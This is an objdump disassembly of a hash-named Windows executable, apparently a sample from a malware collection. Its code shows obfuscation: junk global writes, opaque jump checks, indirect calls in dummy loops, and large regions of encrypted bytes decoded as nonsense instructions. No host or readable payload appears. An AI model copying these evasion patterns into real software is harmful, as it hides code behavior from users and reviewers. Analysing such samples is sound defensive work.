
264e531854010459572efa24175c1d04cf3f2367e89928ed597fc776f91d2cd0.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	mov    DWORD PTR ds:0x4344a9,0x7186
  401015:	mov    DWORD PTR [ebp-0x20],eax
  401018:	mov    ecx,DWORD PTR [ebp-0x20]
  40101b:	mov    DWORD PTR ds:0x43441e,0x6cee
  401025:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40102c:	mov    DWORD PTR ds:0x432770,0x6120
  401036:	cmp    ecx,eax
  401038:	mov    DWORD PTR ds:0x43449d,0x7018
  401042:	jne    0x4019f7
  401048:	mov    ax,WORD PTR [ebp-0x24]
  40104c:	push   esi
  40104d:	mov    DWORD PTR ds:0x43277c,0x1b
  401057:	cmp    DWORD PTR ds:0x43277c,0x0
  40105e:	je     0x40108e
  401064:	cmp    DWORD PTR ds:0x43277c,0x22
  40106b:	jne    0x40107c
  401071:	push   0x432e42
  401076:	call   DWORD PTR ds:0x432a32
  40107c:	mov    ecx,DWORD PTR ds:0x43277c
  401082:	dec    ecx
  401083:	mov    DWORD PTR ds:0x43277c,ecx
  401089:	jmp    0x401057
  40108e:	mov    ecx,0x8a3e
  401093:	mov    DWORD PTR ds:0x43440a,0x48c
  40109d:	xor    ax,cx
  4010a0:	add    DWORD PTR ds:0x434499,0x61ba
  4010aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4010ad:	xor    esi,DWORD PTR ds:0x434416
  4010b3:	push   edi
  4010b4:	mov    DWORD PTR ds:0x4343fa,0x1c
  4010be:	cmp    DWORD PTR ds:0x4343fa,0x0
  4010c5:	je     0x401105
  4010cb:	cmp    DWORD PTR ds:0x4343fa,0x25
  4010d2:	jne    0x4010f3
  4010d8:	push   0x38d9
  4010dd:	push   DWORD PTR [ebp-0xc]
  4010e0:	push   0x7b63
  4010e5:	push   0x618f
  4010ea:	push   DWORD PTR [ebp-0x28]
  4010ed:	call   DWORD PTR ds:0x432a36
  4010f3:	mov    edi,DWORD PTR ds:0x4343fa
  4010f9:	dec    edi
  4010fa:	mov    DWORD PTR ds:0x4343fa,edi
  401100:	jmp    0x4010be
  401105:	mov    edi,0x3b04
  40110a:	xor    DWORD PTR ds:0x432780,edx
  401110:	add    ax,di
  401113:	add    DWORD PTR ds:0x43441a,0xf3f
  40111d:	movzx  eax,ax
  401120:	add    DWORD PTR ds:0x432774,edi
  401126:	not    eax
  401128:	or     esi,DWORD PTR ds:0x434491
  40112e:	and    eax,DWORD PTR [ecx]
  401130:	movzx  ecx,WORD PTR ds:0x432e42
  401137:	xor    DWORD PTR ds:0x432e66,ecx
  40113d:	mov    ecx,DWORD PTR [ebp+0x8]
  401140:	sub    DWORD PTR ds:0x4344a5,ecx
  401146:	mov    DWORD PTR [ecx],eax
  401148:	adc    ecx,0x6b0b
  40114e:	mov    ecx,0x7510855
  401153:	sbb    esi,DWORD PTR ds:0x432e5a
  401159:	mov    esi,0x32729c
  40115e:	sbb    DWORD PTR ds:0x4344a5,0x3918
  401168:	push   ebx
  401169:	or     DWORD PTR ds:0x434422,ebx
  40116f:	mov    ax,WORD PTR [ebp-0x24]
  401173:	dec    ebx
  401174:	movzx  eax,ax
  401177:	mov    DWORD PTR [ebp-0x38],eax
  40117a:	sub    eax,0x1c8b
  40117f:	mov    eax,DWORD PTR [ebp+0x8]
  401182:	mov    DWORD PTR [ebp-0x28],eax
  401185:	xor    eax,eax
  401187:	or     eax,DWORD PTR ds:0x432e4e
  40118d:	add    DWORD PTR ds:0x4343f6,eax
  401193:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  40119a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4011a1:	mov    eax,0x9577
  4011a6:	or     DWORD PTR ds:0x43441a,0x2325
  4011b0:	mov    WORD PTR [ebp-0x4],ax
  4011b4:	movzx  ebx,BYTE PTR ds:0x432774
  4011bb:	or     DWORD PTR ds:0x432770,ebx
  4011c1:	lea    eax,[ebp-0x30]
  4011c4:	mov    DWORD PTR [ebp-0x34],eax
  4011c7:	mov    eax,DWORD PTR [ebp-0x28]
  4011ca:	mov    DWORD PTR [ebp-0x2c],eax
  4011cd:	add    DWORD PTR ds:0x434499,0x693e
  4011d7:	lea    eax,[ebp-0x18]
  4011da:	and    DWORD PTR ds:0x4343ea,0x0
  4011e4:	jmp    0x4011f6
  4011e9:	mov    ebx,DWORD PTR ds:0x4343ea
  4011ef:	inc    ebx
  4011f0:	mov    DWORD PTR ds:0x4343ea,ebx
  4011f6:	cmp    DWORD PTR ds:0x4343ea,0x18
  4011fd:	jae    0x40123a
  401203:	cmp    DWORD PTR ds:0x4343ea,0x8
  40120a:	jne    0x40121b
  401210:	push   0x7a50
  401215:	call   DWORD PTR ds:0x432a3a
  40121b:	cmp    DWORD PTR ds:0x4343ea,0x7
  401222:	jne    0x401235
  401228:	mov    ebx,DWORD PTR ds:0x4343ea
  40122e:	inc    ebx
  40122f:	mov    DWORD PTR ds:0x4343ea,ebx
  401235:	jmp    0x4011e9
  40123a:	mov    DWORD PTR [ebp-0x1c],eax
  40123d:	mov    eax,DWORD PTR [ebp-0x1c]
  401240:	mov    DWORD PTR [eax],0xf89f2da9
  401246:	mov    eax,DWORD PTR [ebp-0x14]
  401249:	mov    ebx,DWORD PTR [ebp-0x8]
  40124c:	and    DWORD PTR ds:0x434495,0x66ce
  401256:	xor    eax,ecx
  401258:	xor    ebx,ecx
  40125a:	and    DWORD PTR ds:0x434499,0x3a0f
  401264:	xor    edx,edx
  401266:	and    DWORD PTR ds:0x432e66,0x432770
  401270:	add    eax,esi
  401272:	mov    DWORD PTR ds:0x43449d,0x1b71
  40127c:	add    ebx,esi
  40127e:	div    ebx
  401280:	mov    DWORD PTR ds:0x4343f6,0x5747
  40128a:	mov    edx,DWORD PTR [ebp-0x2c]
  40128d:	mov    DWORD PTR ds:0x432774,0x57da
  401297:	cmp    eax,DWORD PTR [edx]
  401299:	mov    DWORD PTR ds:0x434402,0x6b31
  4012a3:	je     0x4019ca
  4012a9:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  4012b0:	lea    eax,[ebp-0xc]
  4012b3:	sbb    edx,DWORD PTR ds:0x432e4a
  4012b9:	mov    DWORD PTR [ebp-0x10],eax
  4012bc:	mov    eax,DWORD PTR [ebp-0x10]
  4012bf:	jmp    0x401447
  4012c4:	popa   
  4012c5:	xchg   BYTE PTR ds:0x6151e949,cl
  4012cb:	mov    dh,0x3f
  4012cd:	mov    ah,0xd5
  4012cf:	mov    dl,0x29
  4012d1:	bnd ret 
  4012d3:	xchg   esi,eax
  4012d4:	jo     0x401346
  4012d6:	jo     0x401348
  4012d8:	in     eax,0x7f
  4012da:	jo     0x40134c
  4012dc:	rcl    bh,0x3d
  4012df:	aad    0x39
  4012e1:	ror    edi,cl
  4012e3:	rol    eax,1
  4012e5:	pop    es
  4012e6:	push   es
  4012e7:	add    ecx,DWORD PTR [esi]
  4012e9:	or     DWORD PTR [edx],eax
  4012eb:	rdpmc  
  4012ed:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  4012f1:	adc    bl,BYTE PTR [edi]
  4012f3:	mov    ecx,0xddb7025a
  4012f8:	add    bh,ch
  4012fa:	mov    ebp,0x8003c8db
  4012ff:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401305:	lods   eax,DWORD PTR ds:[esi]
  401306:	sar    BYTE PTR [eax+0x6fee581f],1
  40130c:	or     edx,DWORD PTR [ecx]
  40130e:	sahf   
  40130f:	jp     0x4012d9
  401311:	inc    edx
  401312:	lods   al,BYTE PTR ds:[esi]
  401313:	push   ebx
  401314:	sub    eax,0xad3ec6d1
  401319:	mov    WORD PTR [ebx-0x3b],?
  40131c:	stos   DWORD PTR es:[edi],eax
  40131d:	js     0x4012e5
  40131f:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401325:	jmp    0x401359
  401327:	mov    ebp,ecx
  401329:	dec    edi
  40132a:	fcomp  DWORD PTR [eax-0x656800bf]
  401330:	pop    es
  401331:	test   eax,0xed4dbddc
  401336:	sub    BYTE PTR [ebp+0x23],dl
  401339:	mov    ah,0xec
  40133b:	pusha  
  40133c:	nop
  40133d:	mov    esi,0x94c3117b
  401342:	and    esi,edx
  401344:	jmp    0x401396
  401346:	(bad)  
  401347:	out    0xba,al
  401349:	repnz in al,dx
  40134b:	xchg   esp,eax
  40134c:	xor    edi,ecx
  40134e:	jbe    0x4013b5
  401350:	xlat   BYTE PTR ds:[ebx]
  401351:	and    cl,ch
  401353:	add    al,0xd9
  401355:	adc    DWORD PTR [ecx-0x68],edx
  401358:	xor    eax,0x7a616f03
  40135d:	or     dh,BYTE PTR [ecx]
  40135f:	fld    QWORD PTR [eax+0x7f752a56]
  401365:	xor    BYTE PTR [edi+0xba8db0c],cl
  40136b:	pop    ebx
  40136c:	push   ebp
  40136d:	(bad)  
  40136f:	or     ebx,edx
  401371:	pop    esi
  401372:	fstp   DWORD PTR [ecx]
  401374:	jno    0x401306
  401376:	mov    eax,0x2b15374b
  40137b:	ja     0x4013a6
  40137d:	sbb    al,0xd3
  40137f:	xor    BYTE PTR [edi-0x16],cl
  401382:	int    0xa6
  401384:	cmp    esi,ebx
  401386:	inc    ebx
  401387:	or     BYTE PTR [esi+eiz*2+0x68],0x25
  40138c:	(bad)  
  40138d:	cli    
  40138e:	call   0x9add:0x36cc1846
  401395:	outs   dx,BYTE PTR ds:[esi]
  401396:	push   cs
  401397:	gs or  al,0x80
  40139a:	and    BYTE PTR [ebx],ah
  40139c:	aas    
  40139d:	mov    ch,0x9b
  40139f:	(bad)  
  4013a0:	adc    edi,DWORD PTR [eax+0x5]
  4013a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013a4:	je     0x40133f
  4013a6:	and    edi,DWORD PTR [ebp-0x1d120355]
  4013ac:	test   eax,0xb8cbb698
  4013b1:	outs   dx,BYTE PTR ds:[esi]
  4013b2:	iret   
  4013b3:	fsubr  DWORD PTR [eax+0x1d]
  4013b6:	aaa    
  4013b7:	push   eax
  4013b8:	sbb    al,0x8a
  4013ba:	ror    DWORD PTR [edx],cl
  4013bc:	lods   eax,DWORD PTR ds:[esi]
  4013bd:	push   0xc00bb4d2
  4013c2:	es fs jecxz 0x4013b0
  4013c6:	mov    dl,0x35
  4013c8:	pushf  
  4013c9:	add    ebx,eax
  4013cb:	outs   dx,DWORD PTR ds:[esi]
  4013cc:	push   esi
  4013cd:	les    ebp,FWORD PTR [edi+0x494fbfe9]
  4013d3:	xlat   BYTE PTR ds:[ebx]
  4013d4:	mov    ah,0x8c
  4013d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013d8:	cld    
  4013d9:	and    al,0xc7
  4013db:	lods   eax,DWORD PTR ds:[esi]
  4013dc:	jmp    0xe935:0xd2e6f665
  4013e3:	stc    
  4013e4:	jge    0x40141e
  4013e6:	ffree  st(4)
  4013e8:	std    
  4013e9:	pop    esi
  4013ea:	(bad)  
  4013eb:	xor    bl,BYTE PTR [ebp+0x78d5c7b]
  4013f1:	or     ch,0xdb
  4013f4:	mov    BYTE PTR [eax+0x7b151a55],ch
  4013fa:	adc    bh,BYTE PTR [ecx*2+0x1ca927e4]
  401401:	mov    WORD PTR [edx+0x1c745114],fs
  401407:	es push ecx
  401409:	lds    edx,FWORD PTR [ecx]
  40140b:	or     ax,0x48de
  40140f:	adc    BYTE PTR [eax+0x69],dh
  401412:	stos   DWORD PTR es:[edi],eax
  401413:	push   ecx
  401414:	and    edx,eax
  401416:	and    al,0x3c
  401418:	add    ah,bl
  40141a:	inc    edi
  40141b:	sub    dh,BYTE PTR [ecx-0x27]
  40141e:	repz pop ebx
  401420:	mov    BYTE PTR [edx],dh
  401422:	cld    
  401423:	xor    dl,bl
  401425:	mov    ecx,DWORD PTR [edi-0x52]
  401428:	mov    al,ds:0x86f02716
  40142d:	ror    BYTE PTR [ecx-0x1a],0x47
  401431:	cld    
  401432:	outs   dx,BYTE PTR ds:[esi]
  401433:	jo     0x4013e7
  401435:	add    ecx,ebx
  401437:	in     eax,dx
  401438:	std    
  401439:	int    0x28
  40143b:	loop   0x401445
  40143d:	or     dh,dh
  40143f:	and    BYTE PTR [esi+ecx*8-0xdf434a0],ah
  401446:	pop    esp
  401447:	mov    edx,DWORD PTR [eax]
  401449:	imul   edx,edx,0xf89ea9ec
  40144f:	mov    DWORD PTR [eax],edx
  401451:	mov    eax,DWORD PTR [ebp-0xc]
  401454:	cmp    eax,0x742b26d4
  401459:	jmp    0x4015e1
  40145e:	push   ds
  40145f:	fcmovnb st,st(2)
  401461:	mov    edx,0x5ba661c1
  401466:	xlat   BYTE PTR ds:[ebx]
  401467:	les    ecx,FWORD PTR [esi]
  401469:	test   DWORD PTR [edx+0x6f],esp
  40146c:	inc    ebx
  40146d:	sbb    al,0xe5
  40146f:	jg     0x4014e1
  401471:	jo     0x401458
  401473:	jg     0x4014e5
  401475:	jo     0x4014b4
  401477:	lods   eax,DWORD PTR ds:[esi]
  401478:	sbb    eax,0x40bfff3b
  40147d:	xchg   ebp,eax
  40147e:	jmp    0xa101a7ee
  401483:	repnz sti 
  401485:	push   esp
  401486:	pop    es
  401487:	push   eax
  401488:	sti    
  401489:	and    al,0x7a
  40148b:	adc    BYTE PTR [edi-0x6e],dl
  40148e:	(bad)  
  40148f:	sub    DWORD PTR [esi+0xe],ebp
  401492:	mov    ebx,0x4d95dd77
  401497:	aam    0x60
  401499:	popa   
  40149a:	mov    al,ds:0x52c89e1e
  40149f:	dec    ebx
  4014a0:	or     esi,DWORD PTR [esi]
  4014a2:	mov    esi,0x6ddf9735
  4014a7:	je     0x4014ce
  4014a9:	ins    BYTE PTR es:[edi],dx
  4014aa:	pop    edx
  4014ab:	or     DWORD PTR [eax+eiz*2-0x3704c52d],esi
  4014b2:	adc    eax,0x8fa76277
  4014b7:	leave  
  4014b8:	and    dl,BYTE PTR [edi-0x2]
  4014bb:	iret   
  4014bc:	push   ds
  4014bd:	adc    eax,0xed21ad18
  4014c2:	fisubr WORD PTR [esi]
  4014c4:	mov    al,ds:0x693cfefc
  4014c9:	ret    0xdb2e
  4014cc:	jle    0x4014b2
  4014ce:	xchg   ebx,eax
  4014cf:	adc    eax,0xdd8921fc
  4014d4:	inc    eax
  4014d5:	(bad)  
  4014d7:	stos   DWORD PTR es:[edi],eax
  4014d8:	and    bh,BYTE PTR [edx]
  4014da:	sub    bl,ch
  4014dc:	pop    ecx
  4014dd:	push   0xffffffe1
  4014df:	iret   
  4014e0:	xor    DWORD PTR [ecx-0x1c15019d],eax
  4014e6:	push   ss
  4014e7:	cmp    al,0xf
  4014e9:	repnz int 0x29
  4014ec:	mov    cl,0xe5
  4014ee:	jmp    0x4014c4
  4014f0:	inc    ebp
  4014f1:	jle    0x40153d
  4014f3:	xchg   esp,eax
  4014f4:	pop    esi
  4014f5:	popa   
  4014f6:	(bad)  
  4014f7:	call   FWORD PTR [edx+0xccfac19]
  4014fd:	imul   esp,DWORD PTR [ecx-0x5e0b348d],0x67
  401504:	mov    ebp,0xa6faffa8
  401509:	cli    
  40150a:	push   ebp
  40150b:	fidiv  WORD PTR [ebx]
  40150d:	cs jb  0x401548
  401510:	test   al,0x90
  401512:	xchg   esp,eax
  401513:	or     al,0x35
  401515:	loopne 0x40153b
  401517:	cmc    
  401518:	dec    ecx
  401519:	std    
  40151a:	je     0x401567
  40151c:	in     al,0x6c
  40151e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40151f:	inc    ecx
  401520:	inc    edi
  401521:	fwait
  401522:	or     eax,0x6b17adb7
  401527:	cli    
  401528:	outs   dx,BYTE PTR ds:[esi]
  401529:	int    0x3
  40152b:	in     al,dx
  40152c:	lea    esi,ss:[ebx+0x3167278e]
  401533:	pop    ecx
  401534:	mov    ds:0x4c949166,eax
  401539:	loope  0x40150d
  40153b:	fcomip st,st(1)
  40153d:	cmp    eax,0xa7478fdf
  401542:	clc    
  401543:	or     eax,0xc350cb6d
  401548:	push   esp
  401549:	je     0x4015c6
  40154b:	sub    al,0x4d
  40154d:	stos   DWORD PTR es:[edi],eax
  40154e:	add    ebp,DWORD PTR [ebx]
  401550:	cli    
  401551:	mov    ecx,0x59a47736
  401556:	sbb    DWORD PTR [esp+eiz*8-0x699e93a4],esi
  40155d:	aaa    
  40155e:	out    dx,al
  40155f:	into   
  401560:	and    cl,BYTE PTR [esi+0x382ccea6]
  401566:	sahf   
  401567:	adc    DWORD PTR ds:0xe42c4847,edx
  40156d:	xchg   ecx,eax
  40156e:	xchg   ebx,eax
  40156f:	loope  0x4015c5
  401571:	and    dl,0x35
  401574:	xchg   edi,eax
  401575:	iret   
  401576:	cmc    
  401577:	xor    eax,0x71c9025e
  40157c:	jnp    0x401526
  40157e:	sbb    esi,esp
  401580:	inc    esp
  401581:	mov    al,al
  401583:	out    dx,eax
  401584:	or     BYTE PTR ds:0xd179079,bl
  40158a:	sub    DWORD PTR [esi],edi
  40158c:	lods   al,BYTE PTR ds:[esi]
  40158d:	retf   
  40158e:	jb     0x401541
  401590:	jne    0x40159a
  401592:	scas   al,BYTE PTR es:[edi]
  401593:	mov    ds:0xe5273f21,eax
  401598:	int3   
  401599:	cmp    eax,0xeaf4db66
  40159e:	pop    ebp
  40159f:	call   0xd1fc0974
  4015a4:	pop    ss
  4015a5:	sbb    DWORD PTR [eax+esi*8-0x54cf04e3],0x3f
  4015ad:	pop    edi
  4015ae:	cmp    al,0x36
  4015b0:	and    dh,cl
  4015b2:	sub    ah,ch
  4015b4:	mov    dl,0xdf
  4015b6:	fdiv   QWORD PTR [edx-0x1a]
  4015b9:	fucomp st(4)
  4015bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015bc:	not    BYTE PTR [esi+ebx*1]
  4015bf:	xor    eax,0xa663e21d
  4015c4:	mov    dh,0xfb
  4015c6:	sbb    eax,0x71a0de82
  4015cb:	in     eax,0xeb
  4015cd:	in     al,0x76
  4015cf:	jo     0x4015a4
  4015d1:	mov    eax,0xbfc0aa73
  4015d6:	mov    al,0x57
  4015d8:	push   ebp
  4015d9:	inc    esi
  4015da:	mov    DWORD PTR [ebx+0x70b5a530],edi
  4015e0:	call   0x4e99f4
  4015e5:	add    BYTE PTR [eax],al
  4015e7:	mov    eax,DWORD PTR [ebp-0x1c]
  4015ea:	or     DWORD PTR [eax],0x60751c9c
  4015f0:	jmp    0x4019d9
  4015f5:	mov    eax,DWORD PTR [ebp-0xc]
  4015f8:	add    eax,DWORD PTR [ebp-0x18]
  4015fb:	cmp    eax,0x6cca547d
  401600:	je     0x401614
  401606:	mov    eax,DWORD PTR [ebp-0x10]
  401609:	and    DWORD PTR [eax],0x751c99
  40160f:	jmp    0x4019d9
  401614:	mov    eax,DWORD PTR [ebp-0xc]
  401617:	mov    edx,DWORD PTR [ebp-0x18]
  40161a:	or     eax,edx
  40161c:	cmp    eax,0xfcbf2ffd
  401621:	je     0x401635
  401627:	mov    eax,DWORD PTR [ebp-0x10]
  40162a:	xor    DWORD PTR [eax],0x2650fa8f
  401630:	jmp    0x4019d9
  401635:	mov    ax,WORD PTR [ebp-0x4]
  401639:	mov    edx,0x8a3e
  40163e:	xor    ax,dx
  401641:	mov    edx,DWORD PTR [ebp-0x28]
  401644:	mov    edx,DWORD PTR [edx]
  401646:	add    ax,di
  401649:	cmp    ax,WORD PTR [edx]
  40164c:	je     0x401821
  401652:	mov    eax,DWORD PTR [ebp-0x14]
  401655:	xor    eax,ecx
  401657:	add    eax,esi
  401659:	mov    DWORD PTR [ebp-0x30],eax
  40165c:	mov    eax,DWORD PTR [ebp-0x34]
  40165f:	mov    dx,WORD PTR [ebp-0x38]
  401663:	mov    ebx,0x8a3e
  401668:	xor    dx,bx
  40166b:	mov    ebx,DWORD PTR [ebp-0x8]
  40166e:	add    dx,di
  401671:	jmp    0x4017f9
  401676:	clc    
  401677:	repnz sbb eax,0xa851698d
  40167d:	icebp  
  40167e:	pusha  
  40167f:	xchg   ebx,eax
  401680:	rcl    DWORD PTR [ebx-0x34],1
  401683:	sbb    al,0x51
  401685:	jg     0x4016d1
  401687:	jle    0x4016f9
  401689:	jo     0x401670
  40168b:	jg     0x4016fd
  40168d:	jo     0x4016b1
  40168f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401690:	mov    ecx,0xad8bdd72
  401695:	pop    ecx
  401696:	push   esp
  401697:	mov    dh,0x8f
  401699:	lds    esp,FWORD PTR [esi-0x63]
  40169c:	popa   
  40169d:	lods   eax,DWORD PTR ds:[esi]
  40169e:	fsubr  QWORD PTR [ebp-0x38d9ba26]
  4016a4:	xchg   edi,eax
  4016a5:	cmp    al,0x2f
  4016a7:	mov    dh,0x34
  4016a9:	mov    eax,ds:0x6a8eb385
  4016ae:	pop    ebp
  4016af:	jle    0x401654
  4016b1:	jne    0x401641
  4016b3:	outs   dx,BYTE PTR ds:[esi]
  4016b4:	and    ch,BYTE PTR [ecx+0x17]
  4016b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016b8:	sbb    al,0x3d
  4016ba:	jne    0x4016d3
  4016bc:	cs inc ecx
  4016be:	xchg   ebp,eax
  4016bf:	stc    
  4016c0:	outs   dx,BYTE PTR ds:[esi]
  4016c1:	sub    al,0x46
  4016c3:	sbb    ebp,DWORD PTR [ebx-0x51c920c3]
  4016c9:	mov    edi,0x6f03654c
  4016ce:	or     bh,al
  4016d0:	pushf  
  4016d1:	sub    cl,ch
  4016d3:	inc    esi
  4016d4:	xchg   esp,eax
  4016d5:	cmc    
  4016d6:	outs   dx,DWORD PTR ds:[esi]
  4016d7:	add    eax,DWORD PTR ss:[ebp-0x32bfb33a]
  4016de:	shl    BYTE PTR [edi-0x2953742b],cl
  4016e4:	xor    ch,ah
  4016e6:	out    0x36,al
  4016e8:	cs add al,bh
  4016eb:	jecxz  0x4016e5
  4016ed:	add    cl,BYTE PTR [eax+0xc29f843]
  4016f3:	sub    ebp,esi
  4016f5:	aam    0x27
  4016f7:	lods   eax,DWORD PTR cs:[esi]
  4016f9:	mov    cs:0xae2445b9,al
  4016ff:	in     al,dx
  401700:	and    esi,DWORD PTR [ecx-0x7e]
  401703:	sub    BYTE PTR [edi-0x46],dl
  401706:	xor    esi,DWORD PTR [ebx+ebp*2]
  401709:	jecxz  0x40172c
  40170b:	sub    BYTE PTR [eax-0x3b],0xf1
  40170f:	int3   
  401710:	jge    0x401753
  401712:	out    dx,eax
  401713:	loope  0x401762
  401715:	sbb    cl,0xfc
  401718:	daa    
  401719:	rcr    BYTE PTR [eax],cl
  40171b:	sti    
  40171c:	nop
  40171d:	adc    bh,BYTE PTR [esi+ebx*8]
  401720:	xor    DWORD PTR [edx-0x6755ea78],eax
  401726:	pop    edx
  401727:	push   cs
  401728:	test   DWORD PTR [eax],ebp
  40172a:	fwait
  40172b:	mov    bh,0x89
  40172d:	inc    ebp
  40172e:	fs mov esi,0xc57e08ec
  401734:	jmp    0xd48:0xc46b69ed
  40173b:	rol    DWORD PTR [edi+0x1321063],1
  401741:	fwait
  401742:	scas   eax,DWORD PTR es:[edi]
  401743:	mov    ecx,0xe17297fb
  401748:	inc    edx
  401749:	ror    DWORD PTR [eax+0x49],cl
  40174c:	cmp    eax,0xc3642113
  401751:	jp     0x401764
  401753:	arpl   WORD PTR [edx+0x53],sp
  401756:	xor    al,0xe5
  401758:	cmp    ah,dh
  40175a:	bound  ecx,QWORD PTR [edi-0x68]
  40175d:	ficom  DWORD PTR [edx-0x1a379f11]
  401763:	test   DWORD PTR [ebp-0x55fc0499],0xc510a90d
  40176d:	in     eax,dx
  40176e:	dec    ebp
  40176f:	mov    ds:0xc38de901,al
  401774:	mov    ah,0x12
  401776:	cmp    BYTE PTR [ebp+0x666a7309],dh
  40177c:	cdq    
  40177d:	inc    ebx
  40177e:	or     al,0xb
  401780:	mov    dh,0xa2
  401782:	ror    BYTE PTR [esi+0x55],1
  401785:	pusha  
  401786:	push   ebp
  401787:	pop    ebp
  401788:	and    DWORD PTR [eax+0x22],ecx
  40178b:	cwde   
  40178c:	xor    al,0xc
  40178e:	xor    bl,BYTE PTR [eax+0x3c]
  401791:	sub    BYTE PTR [ecx+0x6],bh
  401794:	add    eax,0x64eedb79
  401799:	and    DWORD PTR [edx+esi*2+0x4feeba83],0x5aa573d1
  4017a4:	or     DWORD PTR ds:0xea5eb798,edi
  4017aa:	mov    cl,0x6b
  4017ac:	add    al,0x26
  4017ae:	jns    0x4017ce
  4017b0:	dec    ecx
  4017b1:	fwait
  4017b2:	adc    dl,BYTE PTR [ebp+0x7658822d]
  4017b8:	rcl    BYTE PTR [eax+0x7cbf8f9f],0x38
  4017bf:	dec    edx
  4017c1:	test   eax,0x9e46ccb7
  4017c6:	stos   DWORD PTR es:[edi],eax
  4017c7:	jb     0x401779
  4017c9:	stos   DWORD PTR es:[edi],eax
  4017ca:	dec    esi
  4017cb:	jmp    0x2fb6:0x23c6e0af
  4017d2:	jmp    0x49cd:0x5b351d62
  4017d9:	push   es
  4017da:	sti    
  4017db:	adc    eax,0xf4a74dd3
  4017e0:	lods   eax,DWORD PTR ds:[esi]
  4017e1:	dec    edi
  4017e2:	and    dl,BYTE PTR [edi-0x67d47ac6]
  4017e8:	xor    ch,0xb4
  4017eb:	fstp   DWORD PTR [edx-0x737b48b7]
  4017f1:	bound  ebp,QWORD PTR [edi+0x32]
  4017f4:	adc    dh,BYTE PTR gs:[esi+eax*8+0x20]
  4017f9:	movzx  edx,dx
  4017fc:	xor    ebx,ecx
  4017fe:	lea    edx,[edx+ebx*1+0x32729c]
  401805:	add    DWORD PTR [eax],edx
  401807:	mov    eax,DWORD PTR [ebp-0x2c]
  40180a:	mov    edx,DWORD PTR [ebp-0x8]
  40180d:	mov    ebx,DWORD PTR [ebp-0x30]
  401810:	xor    edx,ecx
  401812:	add    edx,esi
  401814:	imul   edx,ebx
  401817:	sub    DWORD PTR [eax],edx
  401819:	mov    eax,DWORD PTR [ebp-0x14]
  40181c:	jmp    0x4019dc
  401821:	mov    eax,DWORD PTR [ebp-0xc]
  401824:	mov    edx,DWORD PTR [ebp-0x18]
  401827:	jmp    0x4019af
  40182c:	pop    ebx
  40182d:	arpl   di,di
  40182f:	out    dx,eax
  401830:	xchg   ebx,esi
  401832:	imul   esi,DWORD PTR [ebx-0x5d],0x7d
  401836:	jae    0x401839
  401838:	push   0xfffffff1
  40183a:	ins    DWORD PTR es:[edi],dx
  40183b:	push   edi
  40183c:	aas    
  40183d:	jl     0x4018af
  40183f:	jo     0x401826
  401841:	jg     0x4018b3
  401843:	jo     0x4018a7
  401845:	popa   
  401846:	lods   al,BYTE PTR ds:[esi]
  401847:	pop    ds
  401848:	xchg   edx,eax
  401849:	pop    edx
  40184a:	es call 0x9180d846
  401850:	jae    0x401843
  401852:	dec    edi
  401853:	pop    ss
  401854:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401855:	push   ds
  401856:	mov    WORD PTR [ebp+0x37a35d77],gs
  40185c:	fcomp  DWORD PTR [ebp+0x7d1f2d38]
  401862:	mov    al,0x67
  401864:	adc    BYTE PTR [edi+esi*4],ah
  401867:	mov    ebp,0x7006a1d
  40186c:	mov    cl,0xb3
  40186e:	mov    dh,0x35
  401870:	mov    ds:0x830ce1f8,eax
  401875:	js     0x4017f8
  401877:	jne    0x4018b0
  401879:	pop    esp
  40187a:	jecxz  0x4018c9
  40187c:	mov    WORD PTR [ebx+0x5aae8af6],ss
  401882:	ins    DWORD PTR es:[edi],dx
  401883:	add    DWORD PTR [edi-0x6e],ecx
  401886:	fidiv  DWORD PTR [esi-0x31]
  401889:	cwde   
  40188a:	dec    esp
  40188b:	cld    
  40188c:	pop    ebp
  40188d:	dec    esi
  40188e:	mov    ds:0xc8b85afb,eax
  401893:	push   0x6e196271
  401898:	or     dh,BYTE PTR [edi]
  40189a:	or     eax,0x5f76abfa
  40189f:	ror    edx,1
  4018a1:	or     esi,esp
  4018a3:	out    dx,al
  4018a4:	ret    
  4018a5:	or     DWORD PTR ss:[edx],eax
  4018a8:	push   cs
  4018a9:	fnsave [edx-0x61b9249f]
  4018af:	xchg   esi,eax
  4018b0:	jno    0x4018e6
  4018b2:	inc    esp
  4018b3:	lahf   
  4018b4:	in     al,dx
  4018b5:	ins    BYTE PTR es:[edi],dx
  4018b6:	inc    esi
  4018b7:	sbb    bh,ah
  4018b9:	inc    eax
  4018ba:	push   ecx
  4018bb:	pop    ebx
  4018bc:	sub    esp,DWORD PTR [esi]
  4018be:	or     edx,DWORD PTR [esi]
  4018c0:	push   ds
  4018c1:	or     eax,0xdb264061
  4018c6:	(bad)  
  4018c7:	lea    ebx,[esi-0x7109359b]
  4018cd:	and    al,0x8d
  4018cf:	mov    esi,DWORD PTR [edi]
  4018d1:	or     BYTE PTR [edx-0x77],al
  4018d4:	test   eax,0x6cc0b46c
  4018d9:	push   ds
  4018da:	in     eax,0xab
  4018dc:	leave  
  4018dd:	pop    es
  4018de:	pop    ecx
  4018df:	ins    DWORD PTR es:[edi],dx
  4018e0:	inc    ebx
  4018e1:	and    cl,BYTE PTR ds:[esi+0x5f]
  4018e5:	and    al,BYTE PTR [edx-0x74]
  4018e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018e9:	sub    eax,0x41970271
  4018ee:	call   0xee0d:0xe54d7dbd
  4018f5:	dec    ecx
  4018f6:	mov    dh,0x92
  4018f8:	pop    ds
  4018f9:	mov    ?,esi
  4018fb:	dec    esi
  4018fc:	jmp    0xea47:0x283a45a3
